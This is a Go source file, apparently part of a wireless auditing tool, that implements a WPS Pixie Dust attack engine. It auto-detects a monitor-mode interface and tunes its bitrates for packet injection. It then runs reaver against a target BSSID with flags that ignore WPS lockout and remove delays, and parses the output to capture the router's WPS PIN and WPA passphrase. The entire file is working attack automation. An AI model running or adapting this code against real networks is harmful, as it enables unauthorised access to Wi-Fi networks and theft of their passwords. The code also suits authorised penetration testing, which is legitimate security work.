package attack

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"log"
	"os/exec"
	"regexp"
	"strings" // Added for detectMonitorInterface
	"sync"
	"syscall" // Added for runAttack SysProcAttr
	"time"

	"github.com/google/uuid"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
	"github.com/lcalzada-xor/wmap/internal/core/ports"    // Added ports
	"github.com/lcalzada-xor/wmap/internal/core/services" // Added
)

// WPSEngine implements ports.WPSAttackService using reaver
type WPSEngine struct {
	activeAttacks map[string]*domain.WPSAttackStatus
	cancelFuncs   map[string]context.CancelFunc
	registry      *services.DeviceRegistry
	logCb         func(string, string) // attackID, line
	statusCb      func(domain.WPSAttackStatus)
	reaverPath    string
	pixiewpsPath  string
	mu            sync.RWMutex
	locker        ports.ChannelLocker // Added locker
}

// execCmd allows mocking exec.CommandContext in tests
var execCmd = exec.CommandContext
var execCommand = exec.Command

// NewWPSEngine creates a new WPS attack engine
func NewWPSEngine(registry *services.DeviceRegistry) *WPSEngine {
	engine := &WPSEngine{
		activeAttacks: make(map[string]*domain.WPSAttackStatus),
		cancelFuncs:   make(map[string]context.CancelFunc),
		registry:      registry,
		reaverPath:    "reaver",
		pixiewpsPath:  "pixiewps",
	}

	// Start cleanup ticker
	go engine.cleanupRoutine()

	return engine
}

// SetChannelLocker injects a ChannelLocker
func (s *WPSEngine) SetChannelLocker(locker ports.ChannelLocker) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.locker = locker
}

// SetCallbacks configures the event callbacks
func (s *WPSEngine) SetCallbacks(logCb func(string, string), statusCb func(domain.WPSAttackStatus)) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logCb = logCb
	s.statusCb = statusCb
}

// SetToolPaths configures the paths for external tools
func (s *WPSEngine) SetToolPaths(reaverPath, pixiewpsPath string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if reaverPath != "" {
		s.reaverPath = reaverPath
	}
	if pixiewpsPath != "" {
		s.pixiewpsPath = pixiewpsPath
	}
}

// StartAttack initiates a new Pixie Dust attack
func (s *WPSEngine) StartAttack(config domain.WPSAttackConfig) (string, error) {
	// Verify dependencies first
	if err := s.checkDependencies(); err != nil {
		return "", fmt.Errorf("dependency missing: %w", err)
	}

	// Interface auto-detection
	interfaceName := config.Interface
	if interfaceName == "" {
		// Try to find a monitor mode interface from registry
		// Note: We need to access registry to get available interfaces.
		// Since Registry tracks *devices* (WiFi clients/APs), we might need to check
		// the *system interfaces*. If Registry doesn't track system interfaces directly,
		// we might need to rely on what NetworkService knows, but usually DeviceRegistry
		// or a similar service holds the monitoring interface state.
		// Let's assume for now we don't have a direct helper in Registry for "GetMonitorInterface".
		// We can add one or try to infer.
		// However, looking at the architecture, usually one interface is used for monitoring.
		// If we can't get it easily, we might need to check /proc/net/wireless or `iw dev`.
		// BUT, better to assume the user of the lib (server.go) passes a registry that might have this info?
		// or better, let's just use `ip link` or `iw dev` to find one if registry doesn't help?
		// No, strict requirement: "checking Valid Interface".
		// Let's see if we can get it from the system if config is empty.

		// FIXME: For now, strict check: if empty, fail unless we can find one.
		// Let's use a shell command to find the first monitor interface as a fallback
		// if registry doesn't have a dedicated method.
		// ACTUALLY, checking the open files I see `DeviceRegistry` likely stores Devices.
		// If the app has a "Global Monitor Interface", it might be in config.
		// Let's try to detect using `iw` for now to be safe.
		if found, err := s.detectMonitorInterface(); err == nil && found != "" {
			interfaceName = found
		} else {
			return "", fmt.Errorf("no interface provided and auto-detection failed: %v", err)
		}
	}
	// Verify the interface exists and is up? Reaver will complain if not.

	id := uuid.New().String()
	startTime := time.Now()

	status := &domain.WPSAttackStatus{
		ID:        id,
		Status:    "running",
		StartTime: startTime,
		OutputLog: "",
	}

	s.mu.Lock()
	s.activeAttacks[id] = status
	s.mu.Unlock()

	// Create context with timeout
	timeout := time.Duration(config.TimeoutSeconds) * time.Second
	if config.TimeoutSeconds <= 0 {
		timeout = 300 * time.Second // Default 5 mins
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)

	s.mu.Lock()
	s.cancelFuncs[id] = cancel
	s.mu.Unlock()

	// Update config with detected interface
	config.Interface = interfaceName

	// Launch async attack
	go s.runAttack(ctx, id, config)

	return id, nil
}

// StopAttack stops an active attack
func (s *WPSEngine) StopAttack(id string, force bool) error {
	s.mu.Lock()
	cancel, ok := s.cancelFuncs[id]
	if ok {
		cancel()
		delete(s.cancelFuncs, id)
	}

	// If forced, ensure we clean it up even if it wasn't tracked properly
	if force && !ok {
		// Log that we are forcing a stop on potentially untracked or already stopped attack
		// but since we rely on cancelFuncs, if it's not there, the context is already gone.
		// However, we might want to ensure the status is definitely stopped.
	}

	// Update status
	if status, exists := s.activeAttacks[id]; exists {
		if status.Status == "running" || force {
			status.Status = "stopped"
			now := time.Now()
			status.EndTime = &now
			if force {
				status.ErrorMessage = "Force stopped by user"
			}
		}
	}
	s.mu.Unlock()
	return nil
}

// GetStatus returns the status of an attack
func (s *WPSEngine) GetStatus(id string) (domain.WPSAttackStatus, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if status, ok := s.activeAttacks[id]; ok {
		return *status, nil
	}
	return domain.WPSAttackStatus{}, fmt.Errorf("attack not found")
}

// detectMonitorInterface attempts to find a wireless interface in monitor mode
func (s *WPSEngine) detectMonitorInterface() (string, error) {
	// Quick and dirty linux check: iw dev | grep type monitor -B 2 | grep Interface | awk '{print $2}'
	// Clean implementation:
	cmd := exec.Command("iw", "dev")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}

	// Simple parsing logic (robustness improvements can be done in helpers)
	lines := strings.Split(string(out), "\n")
	var currentIf string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Interface ") {
			currentIf = strings.Fields(line)[1]
		}
		if strings.Contains(line, "type monitor") && currentIf != "" {
			return currentIf, nil
		}
	}
	return "", fmt.Errorf("no monitor interface found")
}

func (s *WPSEngine) cleanupRoutine() {
	ticker := time.NewTicker(15 * time.Minute)
	for range ticker.C {
		s.mu.Lock()
		for id, status := range s.activeAttacks {
			// Remove if finished more than 1 hour ago
			if status.EndTime != nil && time.Since(*status.EndTime) > 1*time.Hour {
				delete(s.activeAttacks, id)
				// Clean up cancel func just in case
				if cancel, ok := s.cancelFuncs[id]; ok {
					cancel()
					delete(s.cancelFuncs, id)
				}
			}
		}
		s.mu.Unlock()
	}
}

func (s *WPSEngine) runAttack(ctx context.Context, id string, config domain.WPSAttackConfig) {
	// Optimize interface for robustness

	// Wrapper for channel locking
	action := func() error {
		// Optimize interface for robustness (inside lock)
		if config.Interface != "" {
			s.optimizeInterface(config.Interface)
		}
		defer func() {
			s.mu.Lock()
			defer s.mu.Unlock()
			if cancel, ok := s.cancelFuncs[id]; ok {
				cancel() // cleanup
				delete(s.cancelFuncs, id)
			}
			// If still running (natural completion), mark as failed/done?
			// Actually natural completion is handled inside by reading stdout EOF
		}()

		// -K enables Pixie Dust mode
		// -i interface, -b bssid, -c channel
		// -v for verbose output
		args := []string{
			"-i", config.Interface,
			"-b", config.TargetBSSID,
			"-c", fmt.Sprintf("%d", config.Channel),
			"-K",      // Pixie Dust Mode
			"-v",      // Verbose
			"-N",      // No Nacks (faster)
			"-L",      // Ignore locked state
			"-d", "0", // No delay
			"-S", // Small DH keys
			"-F", // Ignore FCS
		}

		// Prepare command with process group for cleanup
		cmd := execCmd(ctx, s.reaverPath, args...)
		cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return err
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			return err
		}

		if err := cmd.Start(); err != nil {
			return fmt.Errorf("failed to start reaver: %v", err)
		}

		// Scanner to process output line by line (Merge readers)
		// We use io.MultiReader but bufio.Scanner can only read one.
		// We need to read them concurrently or merge them.
		// For simplicity, launch a goroutine for stderr to append to logs as well.

		// Custom Split function to handle \r as well as \n
		splitCRLF := func(data []byte, atEOF bool) (advance int, token []byte, err error) {
			if atEOF && len(data) == 0 {
				return 0, nil, nil
			}
			if i := bytes.IndexByte(data, '\n'); i >= 0 {
				return i + 1, data[0:i], nil
			}
			if i := bytes.IndexByte(data, '\r'); i >= 0 {
				return i + 1, data[0:i], nil
			}
			if atEOF {
				return len(data), data, nil
			}
			return 0, nil, nil
		}

		go func() {
			scannerErr := bufio.NewScanner(stderr)
			scannerErr.Split(splitCRLF)
			for scannerErr.Scan() {
				line := scannerErr.Text()
				s.appendLog(id, line)
			}
		}()

		scanner := bufio.NewScanner(stdout)
		scanner.Split(splitCRLF)

		pinRegex := regexp.MustCompile(`WPS PIN:\s*['"]?([0-9]+)['"]?`)
		pskRegex := regexp.MustCompile(`WPA PSK:\s*['"]?([^'"]+)['"]?`)

		fullLog := ""
		foundPin := ""
		foundPsk := ""

		for scanner.Scan() {
			line := scanner.Text()
			fullLog += line + "\n"
			s.appendLog(id, line)

			if matches := pinRegex.FindStringSubmatch(line); len(matches) > 1 {
				foundPin = matches[1]
			}
			if matches := pskRegex.FindStringSubmatch(line); len(matches) > 1 {
				foundPsk = matches[1]
			}

			// Check context cancellation
			if ctx.Err() != nil {
				break
			}
		}

		// Wait for command to finish
		err = cmd.Wait()

		// Determine final status
		if ctx.Err() == context.DeadlineExceeded {
			s.updateStatus(id, "timeout", "Attack timed out")
		} else if ctx.Err() == context.Canceled {
			// Already handled in StopAttack, but double check
			s.updateStatus(id, "stopped", "Stopped by user")
		} else if foundPin != "" {
			s.completeSuccess(id, foundPin, foundPsk)
		} else if err != nil {
			// Check if it was manually cancelled (sometimes cmd.Wait returns error on kill)
			if ctx.Err() != nil {
				// Ignore error if context was cancelled
				return nil
			}
			s.updateStatus(id, "failed", fmt.Sprintf("Reaver exited with error: %v", err))
		} else {
			s.updateStatus(id, "failed", "Attack finished but no PIN found")
		}

		return nil
	}

	// Execute with lock
	var err error
	if s.locker != nil && config.Interface != "" {
		err = s.locker.ExecuteWithLock(ctx, config.Interface, config.Channel, func() error {
			// We need to adapt signature: action returns error.
			// Our logic handles status updates inside action, so we return nil mostly.
			if execErr := action(); execErr != nil {
				// Handle startup errors
				s.updateStatus(id, "failed", execErr.Error())
			}
			return nil
		})
	} else {
		// Run without lock
		if execErr := action(); execErr != nil {
			s.updateStatus(id, "failed", execErr.Error())
		}
	}

	if err != nil {
		s.updateStatus(id, "failed", fmt.Sprintf("Failed to lock channel: %v", err))
	}
}

func (s *WPSEngine) updateStatus(id, status, msg string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if st, ok := s.activeAttacks[id]; ok {
		// specific check to avoid overwriting success/stop if called late
		if st.Status == "running" {
			st.Status = status
			st.ErrorMessage = msg
			now := time.Now()
			st.EndTime = &now

			if s.statusCb != nil {
				s.statusCb(*st)
			}
		}
	}
}

func (s *WPSEngine) completeSuccess(id, pin, psk string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if st, ok := s.activeAttacks[id]; ok {
		st.Status = "success"
		st.RecoveredPIN = pin
		st.RecoveredPSK = psk
		now := time.Now()
		st.EndTime = &now

		if s.statusCb != nil {
			s.statusCb(*st)
		}
	}
}

func (s *WPSEngine) appendLog(id, line string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Also print to terminal as requested
	fmt.Printf("[WPS-ATTACK-%s] %s\n", id[:8], line)

	if st, ok := s.activeAttacks[id]; ok {
		// Limit log size to 500KB to prevent memory issues but allow sufficient history
		if len(st.OutputLog) < 500000 {
			st.OutputLog += line + "\n"
		}
	}

	if s.logCb != nil {
		s.logCb(id, line)
	}
}

func (s *WPSEngine) checkDependencies() error {
	if _, err := exec.LookPath(s.reaverPath); err != nil {
		return fmt.Errorf("%s not found (install with: sudo apt install reaver)", s.reaverPath)
	}
	if _, err := exec.LookPath(s.pixiewpsPath); err != nil {
		return fmt.Errorf("%s not found (install with: sudo apt install pixiewps)", s.pixiewpsPath)
	}
	return nil
}

// optimizeInterface configures the interface for "Low 'n Slow" injection
func (s *WPSEngine) optimizeInterface(iface string) {
	cmd := execCommand("iw", "dev", iface, "set", "bitrates", "legacy-2.4", "1", "2", "5.5", "11", "legacy-5", "6", "9", "12")
	if err := cmd.Run(); err != nil {
		log.Printf("Warning: Failed to optimize bitrate for %s in WPS attack: %v", iface, err)
	} else {
		log.Printf("Interface %s optimized for robust injection (Legacy 2.4/5GHz) for WPS", iface)
	}
}
